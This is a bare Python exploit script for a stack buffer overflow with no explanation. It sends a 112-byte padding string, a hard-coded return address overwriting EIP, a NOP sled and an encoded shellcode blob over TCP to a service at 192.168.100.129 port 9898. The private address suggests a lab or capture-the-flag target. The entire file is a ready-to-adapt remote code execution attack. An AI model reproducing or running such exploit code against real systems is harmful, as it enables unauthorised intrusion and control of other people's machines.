#!/usr/bin/env python3

import socket

offset = 112
before_eip = b"A" * offset

eip = b"\x55\x9d\x04\x08"

shellcode =  b""
shellcode += b"\xd9\xc3\xbe\xb5\xa5\x85\x35\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x12\x83\xea\xfc\x31\x72\x13"
shellcode += b"\x03\xc7\xb6\x67\xc0\x16\x62\x90\xc8\x0b\xd7"
shellcode += b"\x0c\x65\xa9\x5e\x53\xc9\xcb\xad\x14\xb9\x4a"
shellcode += b"\x9e\x2a\x73\xec\x97\x2d\x72\x84\xe7\x66\xe0"
shellcode += b"\xd4\x80\x74\xe9\xc1\xe3\xf0\x08\x59\x65\x53"
shellcode += b"\x9a\xca\xd9\x50\x95\x0d\xd0\xd7\xf7\xa5\x85"
shellcode += b"\xf8\x84\x5d\x32\x28\x44\xff\xab\xbf\x79\xad"
shellcode += b"\x78\x49\x9c\xe1\x74\x84\xdf"

after_eip = b"\x90"*32 + shellcode

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.129", 9898))
s.send(payload)
s.close()
